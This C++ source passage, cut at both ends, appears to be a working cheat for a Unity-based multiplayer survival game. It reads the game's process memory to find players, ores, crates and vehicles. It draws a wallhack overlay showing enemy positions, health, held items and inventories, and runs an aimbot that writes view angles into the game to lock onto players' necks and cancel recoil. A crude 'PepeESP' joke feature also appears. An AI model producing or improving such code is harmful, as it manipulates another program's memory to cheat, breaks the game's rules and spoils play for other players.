						if (VehicleList.size() > 100)
							VehicleList.clear();
						VehicleList.push_back(object);
					}
				}
				else if (class_name == "ScrapTransportHelicopter")
				{
					VehicleClass object;
					object.Object = current_object;
					object.Name = "Scrap Helicopter";
					const auto unk1 = mex.Read<uintptr_t>(object.Object + 0x10);

					if (!unk1)
						continue;

					const auto unk2 = mex.Read<uintptr_t>(unk1 + 0x30);

					if (!unk2)
						continue;



					const auto unk3 = mex.Read<uintptr_t>(unk2 + 0x30);

					if (!unk3)
						continue;



					/* shouldn't be needed, but in case */
					if (!object.Object)
						continue;

					Vector2 ScreenPos;
					Vector3 OrePos = get_obj_pos(unk3);

					auto distance = Math::Calc3D_Dist(localPos, OrePos);
					if (distance < 100)
					{
						if (VehicleList.size() > 100)
							VehicleList.clear();
						VehicleList.push_back(object);
					}
				}
				else if (class_name == "MotorRowboat")
				{
					VehicleClass object;
					object.Object = current_object;
					object.Name = "Small Boat";
					const auto unk1 = mex.Read<uintptr_t>(object.Object + 0x10);

					if (!unk1)
						continue;

					const auto unk2 = mex.Read<uintptr_t>(unk1 + 0x30);

					if (!unk2)
						continue;



					const auto unk3 = mex.Read<uintptr_t>(unk2 + 0x30);

					if (!unk3)
						continue;



					/* shouldn't be needed, but in case */
					if (!object.Object)
						continue;

					Vector2 ScreenPos;
					Vector3 OrePos = get_obj_pos(unk3);

					auto distance = Math::Calc3D_Dist(localPos, OrePos);
					if (distance < 100)
					{
						if (VehicleList.size() > 100)
							VehicleList.clear();
						VehicleList.push_back(object);
					}
				}
				else if (class_name == "TreeEntity" || class_name == "SleepingBag" || class_name == "Door" || class_name == "BuildingBlock" || class_name == "KeyLock" || class_name == "OreHotSpot" || class_name == "PlantEntity" || class_name == "VendingMachineMapMarker" || class_name == "ExcavatorArm" || class_name == "EnvSync" || class_name == "FireBall" || class_name == "BaseVehicleSeat" || class_name == "ResourceEntity" || class_name == "PlantEntity" || class_name == "PlantEntity" || class_name == "PlantEntity" || class_name == "PlantEntity")
				{
					continue;
				}
				else if (class_name.find("DroppedItem") != std::string::npos)
				{
					auto CurrentItem = mex.Read<uintptr_t>(current_object + 0x150);
					DWORD64 objectClass = mex.Read<DWORD64>(object + 0x30);
					DWORD64 transform = mex.Read<DWORD64>(objectClass + 0x8);
					DWORD64 visualState = mex.Read<DWORD64>(transform + 0x38);
					Vector2 ScreenPos;
					Vector3 Pos = mex.Read<Vector3>(visualState + 0x90);
					auto distance = Math::Calc3D_Dist(localPos, Pos);
					if (distance < 200)
					{
						if (DroppedItemList.size() > 100)
							DroppedItemList.clear();
						Item object;
						object.Item = CurrentItem;
						object.ObjectClass = objectClass;
						DroppedItemList.push_back(object);
					}
				}
				else if (tag == 0)
				{
					continue;
					//char className[0x100];
					//auto name_pointer = mex.Read<uint64_t>(object + 0x60);
					//mex.Read(name_pointer, &className, sizeof(className));
					//classfile << className << std::endl;
				}
			}
			//classfile.close();
		}

		catch (...)
		{

		}
	}
}

void drawLoop(int Width, int Height)
{
	ScreenWidth = Width;
	ScreenHeight = Height;
	//std::cout << "Setting Up Clocks!" << std::endl;
	ticks += 1;
	if (beforeclock == 0) {
		beforeclock = clock();
	}

	DrawCircle(ScreenWidth / 2, ScreenHeight / 2, MaxAimFOV, 0.5, 1, 1, 1, 1, false);

	if (GetAsyncKeyState(VK_NUMPAD1) & 1)
	{
		ESPEnabled = !ESPEnabled;
	}
	if (GetAsyncKeyState(VK_NUMPAD2) & 1)
	{
		PlayerESPEnabled = !PlayerESPEnabled;
	}

	if (GetAsyncKeyState(VK_NUMPAD3) & 1)
	{
		ShowOres = !ShowOres;
	}

	if (GetAsyncKeyState(VK_NUMPAD4) & 1)
	{
		ShowCollectables = !ShowCollectables;
	}

	if (GetAsyncKeyState(VK_NUMPAD5) & 1)
	{
		ShowDroppedItems = !ShowDroppedItems;
	}

	if (GetAsyncKeyState(VK_NUMPAD6) & 1)
	{
		ShowCrates = !ShowCrates;
	}

	if (GetAsyncKeyState(VK_NUMPAD7) & 1)
	{
		AimbotEnabled = !AimbotEnabled;
	}

	if (GetAsyncKeyState(VK_NUMPAD8) & 1)
	{
		AlwaysDay = !AlwaysDay;
	}

	if (GetAsyncKeyState(VK_INSERT) & 1)
	{
		MenuOpen = !MenuOpen;
	}

	menu.Render();
	//std::cout << "Check if menu open." << std::endl;
	if (false)
	{
		//std::cout << "Menu Is Open!" << std::endl;
		std::string espstring;
		std::string playerespstring;
		std::string oreespstring;
		std::string collectablesespstring;
		std::string vehiclesespstring;
		std::string crateespstring;
		std::string aimbotstring;
		std::string spiderstring;
		std::string alwaysdaystring;
		if (ESPEnabled)
			espstring = "ESP [Num Pad 1]: Enabled";
		else
			espstring = "ESP [Num Pad 1]: Disabled";

		if (PlayerESPEnabled)
			playerespstring = "Player ESP [Num Pad 2]: Enabled";
		else
			playerespstring = "Player ESP [Num Pad 2]: Disabled";

		if (ShowOres)
			oreespstring = "Ore ESP [Num Pad 3]: Enabled";
		else
			oreespstring = "Ore ESP [Num Pad 3]: Disabled";

		if (ShowCollectables)
			collectablesespstring = "Collectables ESP [Num Pad 4]: Enabled";
		else
			collectablesespstring = "Collectables ESP [Num Pad 4]: Disabled";

		if (ShowDroppedItems)
			vehiclesespstring = "DroppedItems ESP [Num Pad 5]: Enabled";
		else
			vehiclesespstring = "DroppedItems ESP [Num Pad 5]: Disabled";

		if (ShowCrates)
			crateespstring = "Crate ESP [Num Pad 6]: Enabled";
		else
			crateespstring = "Crate ESP [Num Pad 6]: Disabled";

		if (AimbotEnabled)
			aimbotstring = "Aimbot [Num Pad 7]: Enabled";
		else
			aimbotstring = "Aimbot [Num Pad 7]: Disabled";

		if (AlwaysDay)
			alwaysdaystring = "AlwaysDay [Num Pad 8]: Enabled";
		else
			alwaysdaystring = "AlwaysDay [Num Pad 8]: Disabled";

		int textyoffset = 0;
		DrawWString(L"RENAME ME | Internal", 15, 0, textyoffset, 1, 0, 0);
		textyoffset += 15;
		DrawWString(s2ws(espstring), 15, 0, textyoffset, 1, 0.5f, 0);
		textyoffset += 15;
		DrawWString(s2ws(playerespstring), 15, 0, textyoffset, 1, 0.5f, 0);
		textyoffset += 15;
		DrawWString(s2ws(oreespstring), 15, 0, textyoffset, 1, 0.5f, 0);
		textyoffset += 15;
		DrawWString(s2ws(collectablesespstring), 15, 0, textyoffset, 1, 0.5f, 0);
		textyoffset += 15;
		DrawWString(s2ws(vehiclesespstring), 15, 0, textyoffset, 1, 0.5f, 0);
		textyoffset += 15;
		DrawWString(s2ws(crateespstring), 15, 0, textyoffset, 1, 0.5f, 0);
		textyoffset += 15;
		DrawWString(s2ws(aimbotstring), 15, 0, textyoffset, 1, 0.5f, 0);
		textyoffset += 15;
		DrawWString(s2ws(alwaysdaystring), 15, 0, textyoffset, 1, 0.5f, 0);
		textyoffset += 15;
		DrawWString(s2ws("Press Insert To Close The Menu!"), 15, 0, textyoffset, 1, 0.5f, 0);
	}

	UnityBaseAddress = mex.GetModuleBase("UnityPlayer.dll");
	//std::cout << "Unity Assembly: " << std::hex << std::uppercase << UnityBaseAddress << std::endl;
	if (!UnityBaseAddress)
	{
		std::cout << "!UnityBaseAddress" << std::endl;
		return;
	}

	GOM = mex.Read<uintptr_t>(UnityBaseAddress + 0x17A6AD8);
	//std::cout << "GOM: " << std::hex << std::uppercase << GOM << std::endl;
	if (!GOM)
	{
		//std::cout << "!GOM" << std::endl;
		return;
	}

	DWORD64 taggedObjects = mex.Read<DWORD64>(GOM + 0x8);
	if (!taggedObjects)
	{
		//std::cout << "!taggedObjects" << std::endl;
		return;
	}

	DWORD64 gameObject = mex.Read<DWORD64>(taggedObjects + 0x10);
	if (!gameObject)
	{
		std::cout << "!gameObject" << std::endl;
		return;
	}

	DWORD64 objClass = mex.Read<DWORD64>(gameObject + 0x30);
	if (!objClass)
	{
		std::cout << "!objClass" << std::endl;
		return;
	}

	DWORD64 ent = mex.Read<DWORD64>(objClass + 0x18);
	if (!ent)
	{
		//std::cout << "!ent" << std::endl;
		return;
	}

	pViewMatrix = mex.Read<Matrix4x4>(ent + 0xDC);

	if (ESPEnabled)
	{
		FOV = MaxAimFOV;
		if (PlayerESPEnabled)
		{
			for (BasePlayer player : PlayerList)
			{
				auto pos = player.GetBonePosition(neck);
				if (player.IsLocalPlayer)
				{
					localPos = pos;
					LocalPlayer = player;
					continue;
				}

				auto player_health = player.GetHealth();
				float healthf = nearbyint(player_health);
				int health = (int)(healthf);

				auto distance = Math::Calc3D_Dist(localPos, pos);
				if (distance < 300 && player_health > 0)
				{
					Vector2 ScreenPos;
					if (WorldToScreen(pos, ScreenPos) && !player.IsSleeping())
					{
						curFOV = distance_cursor(ScreenPos);
						if (FOV > curFOV && !player.IsLocalPlayer && player.Player != LocalPlayer.Player)
						{
							FOV = curFOV;
							closestPlayer = player;
						}

						auto HeldGun = player.GetHeldItem().GetItemName();
						char buffer[0x100]{};
						sprintf(buffer, "[%d HP]\n[%dm]", health, (int)distance);
						if (player.GetPlayerModel().IsVisible())
						{
							Vector2 screenHead;
							
							int Width2 = GetSystemMetrics(SM_CXSCREEN);
							int Height2 = GetSystemMetrics(SM_CYSCREEN);
							Vector2 ScreenLocal;
							Vector3 WebLocal;
							WorldToScreen(player.GetVisualPosition(), ScreenLocal);
							int midX = Width / 2;
							int midY = Height / 2;
							
							DrawLine(midX,midY,midX+10,midY,1.0f,255,255,255,1);
							DrawLine(midX+10,midY,midX-20,midY,1.0f,255,255,255,1);
							DrawLine(midX,midY,midX,midY+10,1.0f,255,255,255,1);
							DrawLine(midX,midY,midX,midY-10,1.0f,255,255,255,1);
							Vector2 tempFeetR;
							Vector2 tempFeetL;
							WorldToScreen(player.GetBonePosition(r_foot), tempFeetR);
							WorldToScreen(player.GetBonePosition(l_foot), tempFeetL);
							Vector2 tempHead;
							WorldToScreen(player.GetBonePosition(jaw) + Vector3(0.f, 0.16f, 0.f), tempHead);
							Vector2 tempFeet = (tempFeetR + tempFeetL) / 2.f;
							float Entity_h = tempHead.y - tempFeet.y;
							float w = Entity_h / 4;
							float Entity_x = tempFeet.x - w;
							float Entity_y = tempFeet.y;
							float Entity_w = Entity_h / 2;
							if (BoxESP) {
								DrawBox(Entity_x, Entity_y, Entity_w, Entity_h, 1.f, 0, 242, 255, 1, false);
								DrawBox(Entity_x, Entity_y, Entity_w - 1, Entity_h - 1, 1.f, 196, 203, 204, 0.4, false);
							}
							if (NameESP) {
								DrawWString(player.GetName(), 15, ScreenPos.x, ScreenPos.y, 0, 1, 1);
							}
							if (DistanceESP) {
								int hp = player.GetHealth();
								int maxHP = 100;
								DrawBox(Entity_x + Entity_w - 8.f, Entity_y, 5, Entity_h, 1.f, 134, 131, 131, 0.3, true);
								DrawBox(Entity_x + Entity_w - 8.f, Entity_y, 5, Entity_h * (hp / maxHP), 1.f, 59, 253, 52, 0.3, true);
								
								//DrawString(buffer, 15, ScreenPos.x, ScreenPos.y + 15, 0, 1, 1);
							}
							if (HeldItemESP) {
								DrawWString(HeldGun, 15, ScreenPos.x, ScreenPos.y + 45, 0, 1, 1);
							}

							if (SnapLine) {
								DrawLine(midX, midY, ScreenPos.x, ScreenPos.y + 45, 1, 255, 255, 255, 1);
							}
							// SKELETON
							
							if(SkeletonESP){
								Vector2 lRight;
								Vector2 lLeft;
								Vector2 rightHip;
								Vector2 leftHip;
								Vector2 spine1G;
								Vector2 spine4G;
								Vector2 headG;
								Vector2 l_upperarmG;
								Vector2 r_upperarmG;
								Vector2 l_forearmG;
								Vector2 r_forearmG;
								Vector2 pepe;
								WorldToScreen(GetBonePosition(player.Player,penis),pepe);
								WorldToScreen(GetBonePosition(player.Player,r_foot),lRight);
								WorldToScreen(GetBonePosition(player.Player,l_foot),lLeft);
								WorldToScreen(GetBonePosition(player.Player,r_hip),rightHip);
								WorldToScreen(GetBonePosition(player.Player,l_hip),leftHip);
								WorldToScreen(GetBonePosition(player.Player,l_hip),leftHip);
								WorldToScreen(GetBonePosition(player.Player,spine1),spine1G);
								WorldToScreen(GetBonePosition(player.Player,spine4),spine4G);
								WorldToScreen(GetBonePosition(player.Player, head), headG);
								WorldToScreen(GetBonePosition(player.Player, l_forearm), l_forearmG);
								WorldToScreen(GetBonePosition(player.Player, r_forearm), r_forearmG);
								WorldToScreen(GetBonePosition(player.Player, l_upperarm), l_upperarmG);
								WorldToScreen(GetBonePosition(player.Player, r_upperarm), r_upperarmG);
								DrawLine(lRight.x, lRight.y, rightHip.x, rightHip.y, 1, 255, 255, 255, 1);
								DrawLine(lLeft.x, lLeft.y, leftHip.x, leftHip.y, 1, 255, 255, 255, 1);
								DrawLine(spine1G.x,spine1G.y,spine4G.x,spine4G.y,1,255,255,255,1);
								DrawLine(spine4G.x, spine4G.y, headG.x, headG.y, 1, 255, 255, 255, 1);
								DrawLine(spine4G.x, spine4G.y, l_forearmG.x, l_forearmG.y, 1, 255, 255, 255, 1);
								DrawLine(spine4G.x, spine4G.y, l_forearmG.x, l_forearmG.y, 1, 255, 255, 255, 1);
								DrawLine(l_forearmG.x, l_forearmG.y, l_upperarmG.x, l_upperarmG.y, 1, 255, 255, 255, 1);
								DrawLine(r_forearmG.x, r_forearmG.y, r_upperarmG.x, r_upperarmG.y, 1, 255, 255, 255, 1);
								if(PepeESP){
									DrawLine(spine1G.x,spine1G.y,pepe.x,pepe.y,6,1,0,0,1);
								}

							}

							// SKELETON
							//DrawBox(ScreenPos.x - (width3 / 2), ScreenPos.y, width3 / 6,Height2,1.f,0,1,1,1,false);
							if (curFOV <= 30)
							{
								int yoffset = 60;
								for (int i = 0; i < 6; i++)
								{
									auto ItemName = player.GetPlayerInventory().GetBelt().GetItem(i).GetItemName();
									DrawWString(ItemName, 15, ScreenPos.x, ScreenPos.y + yoffset, 0, 1, 1);
									yoffset += 15;
								}
							}
						}
						else
						{
							int Width2 = GetSystemMetrics(SM_CXSCREEN);
							int Height2 = GetSystemMetrics(SM_CYSCREEN);
							int midX = Width2 / 2;
							int midY = Height2 / 2;
							float width3 = Height2 / 2.4f;
							float width = ScreenPos.y / 2.4f;
														Vector2 tempFeetR;
							Vector2 tempFeetL;
							WorldToScreen(player.GetBonePosition(r_foot), tempFeetR);
							WorldToScreen(player.GetBonePosition(l_foot), tempFeetL);
							Vector2 tempHead;
							WorldToScreen(player.GetBonePosition(jaw) + Vector3(0.f, 0.16f, 0.f), tempHead);
							Vector2 tempFeet = (tempFeetR + tempFeetL) / 2.f;
							float Entity_h = tempHead.y - tempFeet.y;
							float w = Entity_h / 4;
							float Entity_x = tempFeet.x - w;
							float Entity_y = tempFeet.y;
							float Entity_w = Entity_h / 2;
							if (BoxESP) {
								DrawBox(Entity_x, Entity_y, Entity_w, Entity_h, 1.f, 255, 0, 0, 1, false);
								DrawBox(Entity_x, Entity_y, Entity_w - 1, Entity_h - 1, 1.f, 196, 203, 204, 0.4, false);
							}
							if (NameESP) {
								DrawWString(player.GetName(), 15, ScreenPos.x, ScreenPos.y, 1, 0, 0);
							}
							if (DistanceESP) {
								DrawString(buffer, 15, ScreenPos.x, ScreenPos.y + 15, 1, 0, 0);
							}
							if (HeldItemESP) {
								DrawWString(HeldGun, 15, ScreenPos.x, ScreenPos.y + 45, 1, 0,0, 1);
							}
							if(SkeletonESP){
								Vector2 lRight;
								Vector2 lLeft;
								Vector2 rightHip;
								Vector2 leftHip;
								Vector2 spine1G;
								Vector2 spine4G;
								Vector2 headG;
								Vector2 l_upperarmG;
								Vector2 r_upperarmG;
								Vector2 l_forearmG;
								Vector2 r_forearmG;
								Vector2 pepe;
								WorldToScreen(GetBonePosition(player.Player,penis),pepe);
								WorldToScreen(GetBonePosition(player.Player,r_foot),lRight);
								WorldToScreen(GetBonePosition(player.Player,l_foot),lLeft);
								WorldToScreen(GetBonePosition(player.Player,r_hip),rightHip);
								WorldToScreen(GetBonePosition(player.Player,l_hip),leftHip);
								WorldToScreen(GetBonePosition(player.Player,l_hip),leftHip);
								WorldToScreen(GetBonePosition(player.Player,spine1),spine1G);
								WorldToScreen(GetBonePosition(player.Player,spine4),spine4G);
								WorldToScreen(GetBonePosition(player.Player, head), headG);
								WorldToScreen(GetBonePosition(player.Player, l_forearm), l_forearmG);
								WorldToScreen(GetBonePosition(player.Player, r_forearm), r_forearmG);
								WorldToScreen(GetBonePosition(player.Player, l_upperarm), l_upperarmG);
								WorldToScreen(GetBonePosition(player.Player, r_upperarm), r_upperarmG);
								DrawLine(lRight.x, lRight.y, rightHip.x, rightHip.y, 1, 255, 255, 255, 1);
								DrawLine(lLeft.x, lLeft.y, leftHip.x, leftHip.y, 1, 255, 255, 255, 1);
								DrawLine(spine1G.x,spine1G.y,spine4G.x,spine4G.y,1,255,255,255,1);
								DrawLine(spine4G.x, spine4G.y, headG.x, headG.y, 1, 255, 255, 255, 1);
								DrawLine(spine4G.x, spine4G.y, l_forearmG.x, l_forearmG.y, 1, 255, 255, 255, 1);
								DrawLine(spine4G.x, spine4G.y, l_forearmG.x, l_forearmG.y, 1, 255, 255, 255, 1);
								DrawLine(l_forearmG.x, l_forearmG.y, l_upperarmG.x, l_upperarmG.y, 1, 255, 255, 255, 1);
								DrawLine(r_forearmG.x, r_forearmG.y, r_upperarmG.x, r_upperarmG.y, 1, 255, 255, 255, 1);
								
								if(PepeESP){
									DrawLine(spine1G.x,spine1G.y,pepe.x,pepe.y,6,1,0,0,1);
								}

							}


							if (SnapLine) {
								DrawLine(midX, midY, ScreenPos.x, ScreenPos.y + 45, 1, 255, 0, 0, 1);
							}
							//DrawBox(ScreenPos.x - (width / 2), ScreenPos.y, Width,ScreenPos.y,1.f,1,0,0,1,false);
							if (curFOV <= 30)
							{
								int yoffset = 60;
								for (int i = 0; i < 6; i++)
								{
									auto ItemName = player.GetPlayerInventory().GetBelt().GetItem(i).GetItemName();
									DrawWString(ItemName, 15, ScreenPos.x, ScreenPos.y + yoffset, 1, 0, 0);
									yoffset += 15;
								}
							}
						}
					}
				}
			}
		}

		if (ShowOres)
		{
			for (OreClass ore : OreList)
			{
				const auto unk1 = mex.Read<uintptr_t>(ore.Ore + 0x10);

				if (!unk1)
					continue;

				const auto unk2 = mex.Read<uintptr_t>(unk1 + 0x30);

				if (!unk2)
					continue;



				const auto unk3 = mex.Read<uintptr_t>(unk2 + 0x30);

				if (!unk3)
					continue;



				/* shouldn't be needed, but in case */
				if (!ore.Ore)
					continue;




				const auto oreName = mex.Read<uintptr_t>(unk2 + 0x60);
				std::string name = read_ascii(oreName, 64);

				if (name.find("stone-ore") != std::string::npos)
				{
					if (ShowStoneOre)
					{
						Vector2 ScreenPos;
						Vector3 OrePos = get_obj_pos(unk3);

						if (WorldToScreen(OrePos, ScreenPos))
						{
							auto distance = Math::Calc3D_Dist(localPos, OrePos);
							if (distance < 300)
							{
								char buffer[0x100]{};
								sprintf(buffer, "Stone Ore\n[%dm]", (int)distance);
								auto text = s2ws(buffer);
								DrawString(buffer, 15, ScreenPos.x, ScreenPos.y, .5, 0, .5);
							}
						}
					}
				}
				else if (name.find("metal-ore") != std::string::npos)
				{
					if (ShowMetalOre)
					{
						Vector2 ScreenPos;
						Vector3 OrePos = get_obj_pos(unk3);

						if (WorldToScreen(OrePos, ScreenPos))
						{
							auto distance = Math::Calc3D_Dist(localPos, OrePos);
							if (distance < 300)
							{
								char buffer[0x100]{};
								sprintf(buffer, "Metal Ore\n[%dm]", (int)distance);
								auto text = s2ws(buffer);
								DrawString(buffer, 15, ScreenPos.x, ScreenPos.y, .5, 0, .5);
							}
						}
					}
				}
				else if (name.find("sulfur-ore") != std::string::npos)
				{
					if (ShowSulfurOre)
					{
						Vector2 ScreenPos;
						Vector3 OrePos = get_obj_pos(unk3);

						if (WorldToScreen(OrePos, ScreenPos))
						{
							auto distance = Math::Calc3D_Dist(localPos, OrePos);
							if (distance < 300)
							{
								char buffer[0x100]{};
								sprintf(buffer, "Sulfur Ore\n[%dm]", (int)distance);
								auto text = s2ws(buffer);
								DrawString(buffer, 15, ScreenPos.x, ScreenPos.y, .5, 0, .5);
							}
						}
					}
				}
			}
		}

		if (ShowCollectables)
		{
			for (CollectableClass obj : CollectibleList)
			{
				const auto unk1 = mex.Read<uintptr_t>(obj.Object + 0x10);

				if (!unk1)
					continue;

				const auto unk2 = mex.Read<uintptr_t>(unk1 + 0x30);

				if (!unk2)
					continue;



				const auto unk3 = mex.Read<uintptr_t>(unk2 + 0x30);

				if (!unk3)
					continue;



				/* shouldn't be needed, but in case */
				if (!obj.Object)
					continue;




				const auto objName = mex.Read<uintptr_t>(unk2 + 0x60);
				std::string name = read_ascii(objName, 64);
				//std::cout << "Object Name: " << name << std::endl;
				if (name.find("hemp") != std::string::npos)
				{
					Vector2 ScreenPos;
					Vector3 OrePos = get_obj_pos(unk3);

					if (WorldToScreen(OrePos, ScreenPos))
					{
						auto distance = Math::Calc3D_Dist(localPos, OrePos);
						if (distance < 300)
						{
							char buffer[0x100]{};
							sprintf(buffer, "Hemp\n[%dm]", (int)distance);
							auto text = s2ws(buffer);
							DrawString(buffer, 15, ScreenPos.x, ScreenPos.y, 0, 1, 0);
						}
					}
				}
				else if (name.find("metal-collect") != std::string::npos)
				{
					Vector2 ScreenPos;
					Vector3 OrePos = get_obj_pos(unk3);

					if (WorldToScreen(OrePos, ScreenPos))
					{
						auto distance = Math::Calc3D_Dist(localPos, OrePos);
						if (distance < 300)
						{
							char buffer[0x100]{};
							sprintf(buffer, "Metal Col\n[%dm]", (int)distance);
							auto text = s2ws(buffer);
							DrawString(buffer, 15, ScreenPos.x, ScreenPos.y, 0, 1, 0);
						}
					}
				}
				else if (name.find("sulfur") != std::string::npos)
				{
					Vector2 ScreenPos;
					Vector3 OrePos = get_obj_pos(unk3);

					if (WorldToScreen(OrePos, ScreenPos))
					{
						auto distance = Math::Calc3D_Dist(localPos, OrePos);
						if (distance < 300)
						{
							char buffer[0x100]{};
							sprintf(buffer, "Sulfur Col\n[%dm]", (int)distance);
							auto text = s2ws(buffer);
							DrawString(buffer, 15, ScreenPos.x, ScreenPos.y, 0, 1, 0);
						}
					}
				}

				else if (name.find("stone") != std::string::npos)
				{
					Vector2 ScreenPos;
					Vector3 OrePos = get_obj_pos(unk3);

					if (WorldToScreen(OrePos, ScreenPos))
					{
						auto distance = Math::Calc3D_Dist(localPos, OrePos);
						if (distance < 300)
						{
							char buffer[0x100]{};
							sprintf(buffer, "Stone Col\n[%dm]", (int)distance);
							auto text = s2ws(buffer);
							DrawString(buffer, 15, ScreenPos.x, ScreenPos.y, 0, 1, 0);
						}
					}
				}
			}
		}

		if (ShowDroppedItems)
		{
			for (Item item : DroppedItemList)
			{
				Vector3 Pos = item.GetVisualPosition();
				//std::cout << "Getting Item amount" << std::endl;
				auto amount = item.GetAmount();
				//std::cout << "Getting Item distance" << std::endl;
				auto distance = Math::Calc3D_Dist(localPos, Pos);
				//std::cout << "Distance: " << distance << std::endl;
				if (distance < 50)
				{
					//std::cout << ws2s(item.GetItemName()) << " | " << amount << std::endl;
					Vector2 ScreenPos;
					if (WorldToScreen(Pos, ScreenPos))
					{
						char buffer[0x100]{};
						sprintf(buffer, "[%dm]\n[%d]", (int)distance, amount);
						DrawWString(item.GetItemName(), 15, ScreenPos.x, ScreenPos.y, .5, .5, .5);
						DrawString(buffer, 15, ScreenPos.x, ScreenPos.y + 15, .5, .5, .5);

					}
				}
			}
		}

		if (ShowCrates)
		{
			for (CrateClass crate : CrateList)
			{
				const auto unk1 = mex.Read<uintptr_t>(crate.Object + 0x10);

				if (!unk1)
					continue;

				const auto unk2 = mex.Read<uintptr_t>(unk1 + 0x30);

				if (!unk2)
					continue;

				const auto unk3 = mex.Read<uintptr_t>(unk2 + 0x30);

				if (!unk3)
					continue;

				/* shouldn't be needed, but in case */
				if (!crate.Object)
					continue;

				const auto objName = mex.Read<uintptr_t>(unk2 + 0x60);
				std::string name = read_ascii(objName, 64);

				if (name.find("crate_tools") != std::string::npos)
				{
					Vector2 ScreenPos;
					auto Pos = GetCurrentObjectPosition(crate.Object);
					auto distance = Math::Calc3D_Dist(localPos, Pos);
					if (distance < 100)
					{
						if (WorldToScreen(Pos, ScreenPos))
						{
							char buffer[0x100]{};
							sprintf(buffer, "Tools Crate\n[%dm]", (int)distance);
							auto text = s2ws(buffer);
							DrawString(buffer, 15, ScreenPos.x, ScreenPos.y, 1, 0, 1);
						}
					}
				}

				else if (strstr(name.c_str(), "assets/bundled/prefabs/radtown/crate_normal.prefab"))
				{
					Vector2 ScreenPos;
					auto Pos = GetCurrentObjectPosition(crate.Object);
					auto distance = Math::Calc3D_Dist(localPos, Pos);
					if (distance < 100)
					{
						if (WorldToScreen(Pos, ScreenPos))
						{
							char buffer[0x100]{};
							sprintf(buffer, "Military Crate\n[%dm]", (int)distance);
							auto text = s2ws(buffer);
							DrawString(buffer, 15, ScreenPos.x, ScreenPos.y, 0, 0, 0);
						}
					}
				}

				else if (strstr(name.c_str(), "assets/bundled/prefabs/radtown/crate_normal_2.prefab"))
				{
					Vector2 ScreenPos;
					auto Pos = GetCurrentObjectPosition(crate.Object);
					auto distance = Math::Calc3D_Dist(localPos, Pos);
					if (distance < 100)
					{
						if (WorldToScreen(Pos, ScreenPos))
						{
							char buffer[0x100]{};
							sprintf(buffer, "Normal Crate\n[%dm]", (int)distance);
							auto text = s2ws(buffer);
							DrawString(buffer, 15, ScreenPos.x, ScreenPos.y, 0, 0, 0);
						}
					}
				}

				else if (name.find("crate_elite") != std::string::npos)
				{
					Vector2 ScreenPos;
					auto Pos = GetCurrentObjectPosition(crate.Object);
					auto distance = Math::Calc3D_Dist(localPos, Pos);
					if (distance < 100)
					{
						if (WorldToScreen(Pos, ScreenPos))
						{
							char buffer[0x100]{};
							sprintf(buffer, "Elite Crate\n[%dm]", (int)distance);
							auto text = s2ws(buffer);
							DrawString(buffer, 15, ScreenPos.x, ScreenPos.y, 0, 0, 0);
						}
					}
				}

				else if (name.find("barrel") != std::string::npos)
				{
					Vector2 ScreenPos;
					auto Pos = GetCurrentObjectPosition(crate.Object);
					auto distance = Math::Calc3D_Dist(localPos, Pos);
					if (distance < 100)
					{
						if (WorldToScreen(Pos, ScreenPos))
						{
							char buffer[0x100]{};
							sprintf(buffer, "Barrel\n[%dm]", (int)distance);
							auto text = s2ws(buffer);
							DrawString(buffer, 15, ScreenPos.x, ScreenPos.y, 1, 1, 1);
						}
					}
				}
			}
		}
	}

	try
	{
		if (AimbotEnabled)
		{
			if(Silent){
				LocalPlayer.SetRA();
			}
			if (closestPlayer.Player != NULL && LocalPlayer.Player != NULL)
			{
				if (GetKeyState(VK_RBUTTON) & 0x8000)
				{
					Vector2 ScreenPos;
					auto Pos = closestPlayer.GetBonePosition(neck); //GetBonePosition(closestPlayer, neck);
					auto distance = Math::Calc3D_Dist(localPos, Pos);
					if (distance < 300)
					{
						if (WorldToScreen(Pos, ScreenPos))
						{
							auto fov = distance_cursor(ScreenPos);
							if (fov < MaxAimFOV)
							{
								/*if (Predict) {
									Vector3 local = LocalPlayer.GetBonePosition(neck);
									Vector3 player = LocalPlayer.Prediction(closestPlayer, neck);
									Vector2 offset = Math::CalcAngle(local, player) - LocalPlayer.GetVA();
									Vector2 RecoilAng = LocalPlayer.GetRA();
									Normalize(offset.y, offset.x);

									Vector2 AngleToAim = LocalPlayer.GetVA() + offset;

									Normalize(AngleToAim.y, AngleToAim.x);
									LocalPlayer.SetVA(AngleToAim);

								}*/
								if(true) {
									Vector3 LocalPos = LocalPlayer.GetBonePosition(neck); // GetBonePosition(LocalPlayer, neck);
									auto RecAng = LocalPlayer.GetPlayerInput().GetRecoilAngle(); //GetRA(LocalPlayer);
									Vector2 Offset = Math::CalcAngle(LocalPos, Pos) - LocalPlayer.GetPlayerInput().GetViewAngles();
									//printf("Offset VA: %f | %f\n", Offset.x, Offset.y);
									Vector2 AngleToAim = LocalPlayer.GetPlayerInput().GetViewAngles() + Offset;

									AngleToAim = AngleToAim - RecAng;
									Normalize(AngleToAim.y, AngleToAim.x);
									LocalPlayer.GetPlayerInput().SetViewAngles(AngleToAim); // SetVA(LocalPlayer, AngleToAim);*/
								}
							}
						}
					}
				}
			}
		}
	}
	catch (...)
	{
		std::cout << "Aimbot Error!" << std::endl;
	}
}



void startoverlay()
{
	const auto game_window = FindWindowW(L"UnityWndClass", nullptr);
	DirectOverlaySetOption(D2DOV_DRAW_FPS | D2DOV_FONT_ARIAL | D2DOV_REQUIRE_FOREGROUND);
	DirectOverlaySetup(drawLoop, game_window);

	menu.Initialize(L"RENAME ME");

	MenuTab esptab(L"ESP");
	esptab.AddItem(MenuItem(L"ESP Enabled", &ESPEnabled));
	esptab.AddItem(MenuItem(L"Players Enabled", &PlayerESPEnabled));
	esptab.AddItem(MenuItem(L"Skeleton ESP", &SkeletonESP));
	esptab.AddItem(MenuItem(L"Name ESP", &NameESP));
	esptab.AddItem(MenuItem(L"Box ESP", &BoxESP));
	esptab.AddItem(MenuItem(L"HP ESP",&DistanceESP));
	
	esptab.AddItem(MenuItem(L"Held Item ESP", &HeldItemESP));
	esptab.AddItem(MenuItem(L"Snap Line", &SnapLine));
	esptab.AddItem(MenuItem(L"Ores Enabled", &ShowOres));
	esptab.AddItem(MenuItem(L"Collectables Enabled", &ShowCollectables));
	esptab.AddItem(MenuItem(L"Dropped Items Enabled", &ShowDroppedItems));
	esptab.AddItem(MenuItem(L"Vehicles Enabled", &ShowVehicles));
	esptab.AddItem(MenuItem(L"Crates Enabled", &ShowCrates));

	MenuTab aimtab(L"Aimbot");
	aimtab.AddItem(MenuItem(L"Aimbot Enabled", &AimbotEnabled));
	aimtab.AddItem(MenuItem(L"PSilent", &Silent));
	//aimtab.AddItem(MenuItem(L"Prediction [useful]", &Predict));
